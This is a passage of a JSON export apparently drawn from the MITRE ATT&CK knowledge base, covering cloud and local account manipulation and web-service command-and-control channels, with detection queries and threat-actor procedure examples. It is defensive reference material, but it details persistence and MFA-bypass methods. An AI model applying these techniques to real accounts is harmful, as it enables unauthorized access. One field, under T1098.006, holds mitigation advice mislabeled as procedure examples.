      "TheMimikatzcredential dumper has been extended to include Skeleton Key domain controller authentication bypass functionality. TheLSADUMP::ChangeNTLMandLSADUMP::SetNTLMmodules can also manipulate the password hash of an account without knowing the clear text value.[8][9]"
    ]
  },
  "T1098.001": {
    "Name": "Account Manipulation:Additional Cloud Credentials",
    "Description": "Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.For example, adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure / Entra ID.[1][2][3]These credentials include both x509 keys and passwords.[1]With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.[4]In infrastructure-as-a-service (IaaS) environments, after gaining access throughCloud Accounts, adversaries may generate or import their own SSH keys using either theCreateKeyPairorImportKeyPairAPI in AWS or thegcloud compute os-login ssh-keys addcommand in GCP.[5]This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.[6][7]Adversaries may also use theCreateAccessKeyAPI in AWS or thegcloud iam service-accounts keys createcommand in GCP to add access keys to an account. Alternatively, they may use theCreateLoginProfileAPI in AWS to add a password that can be used to log into the AWS Management Console forCloud Service Dashboard.[8][9]If the target account has different permissions from the requesting account, the adversary may also be able to escalate their privileges in the environment (i.e.Cloud Accounts).[10][11]For example, in Entra ID environments, an adversary with the Application Administrator role can add a new set of credentials to their application's service principal. In doing so the adversary would be able to access the service principal’s roles and permissions, which may be different from those of the Application Administrator.[12]In AWS environments, adversaries with the appropriate permissions may also use thests:GetFederationTokenAPI call to create a temporary set of credentials toForge Web Credentialstied to the permissions of the original user account. These temporary credentials may remain valid for the duration of their lifetime even if the original account’s API credentials are deactivated.[13]In Entra ID environments with the app password feature enabled, adversaries may be able to add an app password to a user account.[14]As app passwords are intended to be used with legacy devices that do not support multi-factor authentication (MFA), adding an app password can allow an adversary to bypass MFA requirements. Additionally, app passwords may remain valid even if the user’s primary password is reset.[15]",
    "Detects": [
      "Monitor M365 Audit logs forAdd applicationorAdd serviceprincipaloperations involving the AzureActiveDirectoryworkloads. Scrutinize extended properties such user agents, app display names, and RequiredAppPermissions (e.g., ImpersonationAccessGrants and DirectAccessGrants).Analytic 1 - Creation of applications with unusual permissions or from suspicious user agents/IPs.Note: To detect the creation of potentially malicious applications using hijacked admin credentials or from unusual IP addresses.\"index=\"\"m365_audit_logs\"\" Workload=\"\"AzureActiveDirectory\"\" Operation=\"\"Add application\"\"| search ActorUserPrincipalName!=\"\"expected_admin_user\"\"| table CreationTime, ActorUserPrincipalName, IPAddress, ExtendedProperties, ModifiedProperties\"Analytic 2 - Creation of service principals with suspicious user agents or from unusual IP addresses.Note: To detect the creation of potentially malicious service principals using hijacked admin credentials or from unusual IP addresses.\"index=\"\"m365_audit_logs\"\" Workload=\"\"AzureActiveDirectory\"\" Operation=\"\"Add service principal\"\"| search ActorUserPrincipalName!=\"\"expected_admin_user\"\"| table CreationTime, ActorUserPrincipalName, IPAddress, ExtendedProperties, ModifiedProperties\"",
      "Monitor M365 Audit logs forUpdate applicationorUpdate Service principaloperations involving the AzureActiveDirectory workloads. Look for suspicious modified properties RequiredResourceAccess changes.Analytic 1 - Suspicious modifications to RequiredResourceAccess, unexpected user agents, unusual modification times.Note: To detect suspicious updates to applications which might indicate the granting of unauthorized permissions or impersonation access.\"index=\"\"m365_audit_logs\"\" Workload=\"\"AzureActiveDirectory\"\" Operation=\"\"Update application\"\"| search NOT (UserAgent=\"\"expected_user_agent\"\")| table CreationTime, UserPrincipalName, IPAddress, ExtendedProperties, ModifiedProperties\"Analytic 2 - Suspicious key descriptions, unexpected user agents, unusual modification times.Note: To detect suspicious updates to application certificates and secrets, which might indicate unauthorized access or changes.\"index=\"\"m365_audit_logs\"\" Workload=\"\"AzureActiveDirectory\"\" Operation=\"\"Update application – Certificates and secrets management\"\"| search NOT (UserAgent=\"\"expected_user_agent\"\")| table CreationTime, UserPrincipalName, IPAddress, ExtendedProperties, ModifiedProperties\"Analytic 3 - Suspicious service principal names, unexpected user agents, unusual modification times.Note: To detect suspicious updates to service principals, which might indicate unauthorized access or changes.\"index=\"\"m365_audit_logs\"\" Workload=\"\"AzureActiveDirectory\"\" Operation=\"\"Update service principal\"\"| search NOT (UserAgent=\"\"expected_user_agent\"\")| table CreationTime, UserPrincipalName, IPAddress, ExtendedProperties, ModifiedProperties\"",
      "Monitor for unexpected changes to cloud user accounts, such as Azure Activity Logs highlighting malicious Service Principal and Application modifications.Monitor for the use of API and CLI commands that add passwords, access keys, or tokens to accounts, such asCreateAccessKey,GetFederationToken, andCreateLoginProfilein AWS orservice-accounts keys createin GCP. Also monitor for the usage of APIs that create or import SSH keys, particularly by unexpected users or accounts such as the root account."
    ],
    "Procedure Examples": [
      "DuringC0027,Scattered Spiderused aws_consoler  to create temporary federated credentials for fake users in order to obfuscate which AWS credential is compromised and enable pivoting from the AWS CLI to console sessions without MFA.[16]",
      "Pacucan generate SSH and API keys for AWS infrastructure and additional API keys for other IAM users.[17]",
      "During theSolarWinds Compromise,APT29added credentials to OAuth Applications and Service Principals.[18][19]"
    ]
  },
  "T1098.002": {
    "Name": "Account Manipulation:Additional Email Delegate Permissions",
    "Description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.For example, theAdd-MailboxPermissionPowerShellcmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.[1][2][3]In Google Workspace, delegation can be enabled via the Google Admin console and users can delegate accounts via their Gmail settings.[4][5]Adversaries may also assign mailbox folder permissions through individual folder permissions or roles. In Office 365 environments, adversaries may assign the Default or Anonymous user permissions or roles to the Top of Information Store (root), Inbox, or other mailbox folders. By assigning one or both user permissions to a folder, the adversary can utilize any other account in the tenant to maintain persistence to the target user’s mail folders.[6]This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can addAdditional Cloud Rolesto the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules (ex:Internal Spearphishing), so the messages evade spam/phishing detection mechanisms.[7]",
    "Detects": [
      "Enable the UpdateFolderPermissions action for all logon types. The mailbox audit log will forward folder permission modification events to the Unified Audit Log. Create rules to alert on ModifyFolderPermissions operations where the Anonymous or Default user is assigned permissions other than None.A larger than normal volume of emails sent from an account and similar phishing emails sent from real accounts within a network may be a sign that an account was compromised and attempts to leverage access with modified email permissions is occurring.",
      "Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions (including memberships in privileged groups) being granted to compromised accounts.",
      "Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts."
    ],
    "Procedure Examples": [
      "APT28has used a Powershell cmdlet to grant theApplicationImpersonationrole to a compromised account.[8]",
      "APT29has used a compromised global administrator account in Azure AD to backdoor a service principal withApplicationImpersonationrights to start collecting emails from targeted mailboxes;APT29has also used compromised accounts holdingApplicationImpersonationrights in Exchange to collect emails.[9][10]",
      "DuringHomeLand Justice, threat actors added theApplicationImpersonationmanagement role to accounts under their control to impersonate users and take ownership of targeted mailboxes.[11]",
      "Magic Houndgranted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations.[2]",
      "During theSolarWinds Compromise,APT29added their own devices as allowed IDs for active sync usingSet-CASMailbox, allowing it to obtain copies of victim mailboxes. It also added additional permissions (such as Mail.Read and Mail.ReadWrite) to compromised Application or Service Principals.[12][13][14]"
    ]
  },
  "T1098.003": {
    "Name": "Account Manipulation:Additional Cloud Roles",
    "Description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.[1][2][3][4]With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).[5][4]This account modification may immediately followCreate Accountor other malicious account activity. Adversaries may also modify existingValid Accountsthat they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.For example, in AWS environments, an adversary with appropriate permissions may be able to use theCreatePolicyVersionAPI to define a new version of an IAM policy or theAttachUserPolicyAPI to attach an IAM policy with additional or distinct permissions to a compromised user account.[6]In some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary toCreate Accountor modify a victim-owned account.[7]",
    "Detects": [
      "Collect usage logs from cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins. Monitor for updates to IAM policies and roles attached to user accounts.Analytic 1 - Unusual ActorPrincipalNames, unexpected role assignments to sensitive roles (e.g., Global Admin)Note: To detect the assignment of additional cloud roles using potentially hijacked accounts.\"index=\"\"azure_ad_audit_logs\"\" Category=\"\"RoleManagement\"\" Activity=\"\"Add member to role\"\"| search ActorPrincipalName=\"\"*\"\" AND (Target1ModifiedProperty1NewValue=\"\"Global Administrator\"\" OR Target1ModifiedProperty2NewValue=\"\"Global Administrator\"\") AND IPAddress!=\"\"expected_ip\"\"| table Time, ActorPrincipalName, IPAddress, Target1UserPrincipalName, Target1ModifiedProperty1NewValue\""
    ],
    "Procedure Examples": [
      "DuringC0027,Scattered Spiderused IAM manipulation to gain persistence and to assume or elevate privileges.[8]",
      "LAPSUS$has added the global admin role to accounts they have created in the targeted organization's cloud instances.[9]",
      "DuringC0027,Scattered Spiderused IAM manipulation to gain persistence and to assume or elevate privileges.[8]Scattered Spiderhas also assigned user access admin roles in order to gain Tenant Root Group management permissions in Azure.[10]",
      "During theSolarWinds Compromise,APT29grantedcompany administratorprivileges to a newly created service principle.[11]"
    ]
  },
  "T1098.004": {
    "Name": "Account Manipulation:SSH Authorized Keys",
    "Description": "Adversaries may modify the SSHauthorized_keysfile to maintain persistence on a victim host. Linux distributions, macOS, and ESXi hypervisors commonly use key-based authentication to secure the authentication process of SSH sessions for remote management. Theauthorized_keysfile in SSH specifies the SSH keys that can be used for logging into the user account for which the file is configured. This file is usually found in the user's home directory under<user-home>/.ssh/authorized_keys(or, on ESXi,/etc/ssh/keys-<username>/authorized_keys).[1]Users may edit the system’s SSH config file to modify the directivesPubkeyAuthenticationandRSAAuthenticationto the valueyesto ensure public key and RSA authentication are enabled, as well as modify the directivePermitRootLoginto the valueyesto enable root authentication via SSH.[2]The SSH config file is usually located under/etc/ssh/sshd_config.Adversaries may modify SSHauthorized_keysfiles directly with scripts or shell commands to add their own adversary-supplied public keys. In cloud environments, adversaries may be able to modify the SSH authorized_keys file of a particular virtual machine via the command line interface or rest API. For example, by using the Google Cloud CLI’s \"add-metadata\" command an adversary may add SSH keys to a user account.[3][4]Similarly, in Azure, an adversary may update the authorized_keys file of a virtual machine via a PATCH request to the API.[5]This ensures that an adversary possessing the corresponding private key may log in as an existing user via SSH.[6][7]It may also lead to privilege escalation where the virtual machine or instance has distinct permissions from the requesting user.Where authorized_keys files are modified via cloud APIs or command line interfaces, an adversary may achieve privilege escalation on the target virtual machine if they add a key to a higher-privileged user.SSH keys can also be added to accounts on network devices, such as with theip ssh pubkey-chainNetwork Device CLIcommand.[8]",
    "Detects": [
      "Monitor executed commands and arguments to modify theauthorized_keysor/etc/ssh/sshd_configfiles.",
      "Monitor for changes made to detect changes made to theauthorized_keysfile for each user on a system. Monitor for changes to and suspicious processes modifiying/etc/ssh/sshd_config.",
      "Monitor for suspicious processes modifying theauthorized_keysor/etc/ssh/sshd_configfiles."
    ],
    "Procedure Examples": [
      "Bundlorecreates a new key pair withssh-keygenand drops the newly created user key inauthorized_keysto enable remote login.[9]",
      "Earth Luscahas dropped an SSH-authorized key in the/root/.sshfolder in order to access a compromised server with SSH.[10]",
      "Salt Typhoonhas added SSH authorized_keys under root or other users at the Linux level on compromised network devices.[11]",
      "Skidmaphas the ability to add the public key of its handlers to theauthorized_keysfile to maintain persistence on an infected host.[12]",
      "TeamTNThas added RSA keys inauthorized_keys.[13][14]",
      "XCSSETwill create an ssh key if necessary with thessh-keygen -t rsa -f $HOME/.ssh/id_rsa -Pcommand.XCSSETwill upload a private key file to the server to remotely access the host without a password.[15]"
    ]
  },
  "T1098.005": {
    "Name": "Account Manipulation:Device Registration",
    "Description": "Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network.[1][2]In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account.[3]Similarly, an adversary with existing access to a network may register a device to Entra ID and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.[4][5][6]Devices registered in Entra ID may be able to conductInternal Spearphishingcampaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client.[7]Additionally, an adversary may be able to perform aService Exhaustion Floodon an Entra ID tenant by registering a large number of devices.[8]",
    "Detects": [
      "Monitor for the registration or joining of new device objects in Active Directory. Raise alerts when new devices are registered or joined without using MFA.[13]Analytic 1 - Device registration events with suspicious user agents, unusual OS types, OS versions, or display names.Note: To detect the registration of potentially malicious devices using hijacked admin credentials or from unusual IP addresses.index=\"m365_audit_logs\" Workload=\"AzureActiveDirectory\" Operation IN (\"Add registered owner to device\", \"Add device\", \"Add registered users to device\")| search ActorUserPrincipalName!=\"expected_admin_user\"| table CreationTime, ActorUserPrincipalName, IPAddress, ExtendedProperties, ModifiedProperties",
      "Entra ID creates several log entries when new devices are enrolled, which can be monitored for unexpected device registrations.[8]Additionally, joined devices can be viewed via the Entra ID portal.[14]",
      "Monitor user accounts for new and suspicious device associations, such as those originating from unusual sources, occurring at unusual times, or following a suspicious login.[6]"
    ],
    "Procedure Examples": [
      "AADInternalscan register a device to Azure AD.[9]",
      "APT29has enrolled their own devices into compromised cloud tenants, including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account.[3][10]",
      "DuringC0027,Scattered Spiderregistered devices for MFA to maintain persistence through victims' VPN.[11]",
      "During theSolarWinds Compromise,APT29registered devices in order to enable mailbox syncing via theSet-CASMailboxcommand.[12]"
    ]
  },
  "T1098.006": {
    "Name": "Account Manipulation:Additional Container Cluster Roles",
    "Description": "An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account.[1][2]Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.[3]This account modification may immediately followCreate Accountor other malicious account activity. Adversaries may also modify existingValid Accountsthat they have compromised.Note that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments.[4][5][6]In these cases, this technique may be used in conjunction withAdditional Cloud Roles.",
    "Detects": [
      "Collect usage logs from accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to high-privileged cluster roles that go over a certain threshold of known admins."
    ],
    "Procedure Examples": [
      "Require multi-factor authentication for user accounts integrated into container clusters through cloud deployments or via authentication protocols such as LDAP or SAML.",
      "Ensure that low-privileged accounts do not have permissions to add permissions to accounts or to update container cluster roles."
    ]
  },
  "T1098.007": {
    "Name": "Account Manipulation:Additional Local or Domain Groups",
    "Description": "An adversary may add additional local or domain groups to an adversary-controlled account to maintain persistent access to a system or domain.On Windows, accounts may use thenet localgroupandnet groupcommands to add existing users to local and domain groups.[1][2]On Linux, adversaries may use theusermodcommand for the same purpose.[3]For example, accounts may be added to the local administrators group on Windows devices to maintain elevated privileges. They may also be added to the Remote Desktop Users group, which allows them to leverageRemote Desktop Protocolto log into the endpoints in the future.[4]On Linux, accounts may be added to the sudoers group, allowing them to persistently leverageSudo and Sudo Cachingfor elevated privileges.In Windows environments, machine accounts may also be added to domain groups. This allows the local SYSTEM account to gain privileges on the domain.[5]",
    "Detects": [
      "Monitor events for changes to account objects and/or permissions on systems and the domain. Monitor for modification of account permissions in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Monitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts or machine accounts being unexpectedly added into security groups. Monitor for accounts assigned to admin roles, such as Windows domain administrators, that go over a certain threshold of known admins."
    ],
    "Procedure Examples": [
      "APT3has been known to add created accounts to local admin groups to maintain elevated access.[6]",
      "APT41has added user accounts to the User and Admin groups.[7]",
      "APT5has created their own accounts with Local Administrator privileges to maintain access to systems with short-cycle credential rotation.[8]",
      "DarkGateelevates accounts created through the malware to the local administration group during execution.[9]",
      "Dragonflyhas added newly created accounts to the administrators group to maintain elevated access.[10]",
      "FIN13has assigned newly created accounts the sysadmin role to maintain persistence.[11]",
      "Kimsukyhas added accounts to specific groups withnet localgroup.[12]",
      "Magic Houndhas added a user named DefaultAccount to the Administrators and Remote Desktop Users groups.[13]",
      "Thenet localgroupandnet groupcommands inNetcan be used to add existing users to local and domain groups.[1][2]",
      "ServHelperhas added a user named \"supportaccount\" to the Remote Desktop Users and Administrators groups.[14]",
      "SMOKEDHAMhas added user accounts to local Admin groups.[15]"
    ]
  },
  "T1102": {
    "Name": "Web Service",
    "Description": "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise.[1]Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT32has used Dropbox, Amazon S3, and Google Drive to host malicious downloads.[2]",
      "APT41 DUSTused compromised Google Workspace accounts for command and control.[3]",
      "APT42has used various links, such as links with typo-squatted domains, links to Dropbox files and links to fake Google sites, in spearphishing operations.[4][5][6]",
      "BADHATCHcan be utilized to abusesslip.io, a free IP to domain mapping service, as part of actor-controlled C2 channels.[7]",
      "Bazardownloads have been hosted on Google Docs.[8][9]",
      "BoomBoxcan download files from Dropbox using a hardcoded access token.[10]",
      "Brute Ratel C4can use legitimate websites for external C2 channels including Slack, Discord, and MS Teams.[11]",
      "Bumblebeehas been downloaded to victim's machines from OneDrive.[12]",
      "DuringC0017,APT41used the Cloudflare services for C2 communications.[13]",
      "DuringC0027,Scattered Spiderdownloaded tools from sites including file.io, GitHub, and paste.ee.[14]",
      "Carboncan use Pastebin to receive C2 commands.[15]",
      "CharmPowercan download additional modules from actor-controlled Amazon S3 buckets.[16]",
      "CHIMNEYSWEEPhas the ability to use use Telegram channels to return a list of commands to be executed, to download additional payloads, or to create a reverse shell.[17]",
      "DarkTortillacan retrieve its primary payload from public sites such as Pastebin and Textbin.[18]",
      "Dokihas used the dogechain.info API to generate a C2 address.[19]",
      "DropBookcan communicate with its operators by exploiting the Simplenote, DropBox, and the social media platform, Facebook, where it can create fake accounts to control the backdoor and receive instructions.[20][21]",
      "EXOTIC LILYhas used file-sharing services including WeTransfer, TransferNow, and OneDrive to deliver payloads.[22]",
      "FIN6has used Pastebin and Google Storage to host content for their operations.[23]",
      "FIN8has usedsslip.io, a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control.[24]",
      "Fox Kittenhas used Amazon Web Services to host C2.[25]",
      "Gamaredon Grouphas used GitHub repositories for downloaders which will be obtained by the group's .NET executable on the compromised system.[26]",
      "GuLoaderhas the ability to download malware from Google Drive.[27]",
      "Hildegardhas downloaded scripts from GitHub.[28]",
      "Inceptionhas incorporated at least five different cloud service providers into their C2 infrastructure including CloudMe.[29][30]",
      "Latrodectushas used Google Firebase to download malicious installation scripts.[31]",
      "LazyScripterhas used GitHub to host its payloads to operate spam campaigns.[32]",
      "Mustang Pandahas used DropBox URLs to deliver variants ofPlugX.[33]",
      "NETWIREhas used web services including Paste.ee to host payloads.[34]",
      "ngrokhas been used by threat actors to proxy C2 connections to ngrok service subdomains.[35]",
      "Nightdoorcan utilize Microsoft OneDrive or Google Drive for command and control purposes.[36][37]",
      "DuringOperation Spalax, the threat actors used OneDrive and MediaFire to host payloads.[38]",
      "Raspberry Robinsecond stage payloads can be hosted as RAR files, containing a malicious EXE and DLL, on Discord servers.[39]",
      "RedCurlhas used web services to download malicious files.[40][41]",
      "Rockehas used Pastebin, Gitee, and GitLab for Command and Control.[42][43]",
      "SharpStagehas used a legitimate web service for evading detection.[20]",
      "ShrinkLockeruses a subdomain on the legitimate Cloudflare resource \"trycloudflare[.]com\" to obfuscate the threat actor's actual address and to tunnel information sent from victim systems.[44]",
      "Sibothas used a legitimate compromised website to download DLLs to the victim's machine.[45]",
      "SMOKEDHAMhas used Google Drive and Dropbox to host files downloaded by victims via malicious links.[46]",
      "Snip3can download additional payloads from web services including Pastebin and top4top.[47]",
      "SocGholishhas used Amazon Web Services to host second-stage servers.[48]",
      "TeamTNThas leveraged iplogger.org to send collected data back to C2.[49][50]",
      "Turlahas used legitimate web services including Pastebin, Dropbox, and GitHub for C2 communications.[15][51]",
      "WhisperGatecan download additional payloads hosted on a Discord channel.[52][53][54][55][56]"
    ]
  },
  "T1102.001": {
    "Name": "Web Service:Dead Drop Resolver",
    "Description": "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT41used legitimate websites for C2 through dead drop resolvers (DDR), including GitHub, Pastebin, and Microsoft TechNet.[1]",
      "Astarothcan store C2 information on cloud hosting services such as AWS and CloudFlare and websites like YouTube and Facebook.[2]",
      "BADNEWScollects C2 information via a dead drop resolver.[3][4][5]",
      "BLACKCOFFEEuses Microsoft’s TechNet Web portal to obtain a dead drop resolver containing an encoded tag with the IP address of a command and control server.[6][7]",
      "BRONZE BUTLER's MSGET downloader uses a dead drop resolver to access malicious payloads.[8]",
      "DuringC0017,APT41used dead drop resolvers on two separate tech community forums for theirKEYPLUGWindows-version backdoor; notablyAPT41updated the community forum posts frequently with new dead drop resolvers during the campaign.[9]",
      "CharmPowercan retrieve C2 domain information from actor-controlled S3 buckets.[10]",
      "Grandoreirocan obtain C2 information from Google Docs.[2]",
      "Javalican read C2 information from Google Documents and YouTube.[2]",
      "TheKEYPLUGWindows variant has retrieved C2 addresses from encoded data in posts on tech community forums.[9]",
      "Kimsukyhas usedTRANSLATEXTand a dead drop resolver to retrieve configurations and commands from a public blog site.[11]",
      "Metamorfohas used YouTube to store and hide C&C server domains.[12]",
      "SomeMiniDukecomponents use Twitter to initially obtain the address of a C2 server or as a backup if no hard-coded C2 server responds.[13][14][15]",
      "Patchworkhides base64-encoded and encrypted C2 server locations in comments on legitimate websites.[16]",
      "PlugXuses Pastebin to store C2 addresses.[17]",
      "PolyglotDukecan use Twitter, Reddit, Imgur and other websites to get a C2 URL.[15]",
      "Rockehas used Pastebin to check the version of beaconing malware and redirect to another Pastebin hosting updated malware.[18]",
      "RTMhas used an RSS feed on Livejournal to update a list of encrypted C2 server names.RTMhas also hiddenPonyC2 server IP addresses within transactions on the Bitcoin and Namecoin blockchain.[19][20][21]",
      "RTMhas used an RSS feed on Livejournal to update a list of encrypted C2 server names.[19]",
      "TRANSLATEXThas used a dead drop resolver to retrieve configurations and commands from a public blog site.[11]",
      "Xbashcan obtain a webpage hosted on Pastebin to update its C2 domain list.[22]"
    ]
  },
  "T1102.002": {
    "Name": "Web Service:Bidirectional Communication",
    "Description": "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.",
    "Detects": [
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT12has used blogs and WordPress for C2 infrastructure.[1]",
      "APT28has used Google Drive for C2.[2]",
      "APT37leverages social networking sites and cloud platforms (AOL, Twitter, Yandex, Mediafire, pCloud, Dropbox, and Box) for C2.[3][4]",
      "APT39has communicated with C2 through files uploaded to and downloaded from DropBox.[5]",
      "BADNEWScan use multiple C2 channels, including RSS feeds, Github, forums, and blogs.[6][7][8]",
      "BLACKCOFFEEhas also obfuscated its C2 traffic as normal traffic to sites such as Github.[9][10]",
      "BLUELIGHTcan use different cloud providers for its C2.[11]",
      "BoxCaonhas used DropBox for C2 communications.[12]",
      "TheCALENDARmalware communicates through the use of events in Google Calendar.[13][14]",
      "Carbanakhas used a VBScript named \"ggldr\" that uses Google Apps Script, Sheets, and Forms services for C2.[15]",
      "Clamblingcan use Dropbox to download malicious payloads, send commands, and receive information.[16][17]",
      "One variant ofCloudDukeuses a Microsoft OneDrive account to exchange commands and stolen data with its operators.[18]",
      "Comnieuses blogs and third-party sites (GitHub, tumbler, and BlogSpot) to avoid DNS-based blocking of their communication to the command and control server.[19]",
      "ComRAThas the ability to use the Gmail web UI to receive commands and exfiltrate information.[20][21]",
      "CozyCaruses Twitter as a backup C2 channel to Twitter accounts specified in its configuration file.[22]",
      "CreepyDrivecan use OneDrive for C2.[23]",
      "Crutchcan use Dropbox to receive commands and upload stolen data.[24]",
      "DOGCALLis capable of leveraging cloud storage APIs such as Cloud, Box, Dropbox, and Yandex for C2.[3][25]",
      "Empirecan use Dropbox and GitHub for C2.[26]",
      "FIN7used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.[27]",
      "GLOOXMAILcommunicates to servers operated by Google using the Jabber/XMPP protocol.[13][28]",
      "Grandoreirocan utilize web services including Google sites to send and receive C2 data.[29][30]",
      "HEXANEhas used cloud services, including OneDrive, for C2.[23]",
      "KARAEcan use public cloud-based storage providers for command and control.[3]",
      "Kazuarhas used compromised WordPress blogs as C2 servers.[31]",
      "Kimsukyhas used Blogspot pages and a Github repository for C2.[32][33]",
      "Lazarus Grouphas used GitHub as C2, pulling hosted image payloads then committing command execution output to files in specific directories.[34]",
      "LOWBALLuses the Dropbox cloud storage service for command and control.[35]",
      "Magic Houndmalware can use a SOAP Web service to communicate with its C2 server.[36]",
      "MuddyWaterhas used web services including OneHub to distribute remote access tools.[37]",
      "ODAgentcan use the Microsoft Graph API to access an attacker-controlled OneDrive account and retrieve payloads and backdoor commands.[38]",
      "OilBoosteruses the Microsoft Graph API to connect to an actor-controlled OneDrive account to download and execute files and shell commands, and to create directories to share exfiltrated data.[38]",
      "OilCheckcan use a REST-based Microsoft Graph API to access draft messages in a shared Microsoft Office 365 Outlook email account used for C2 communication.[38]",
      "ForOperation Ghost,APT29used social media platforms to hide communications to C2 servers.[39]",
      "Orzhas used Technet and Pastebin web pages for command and control.[40]",
      "POLONIUMhas used OneDrive and DropBox for C2.[23]",
      "POORAIMhas used AOL Instant Messenger for C2.[3]",
      "PowerStallionuses Microsoft OneDrive as a C2 server via a network drive mapped withnet use.[41]",
      "RegDukecan use Dropbox as its C2 server.[39]",
      "Revenge RATused blogpost.com as its primary command and control server during a campaign.[42]",
      "RogueRobinhas used Google Drive as a Command and Control channel.[43]",
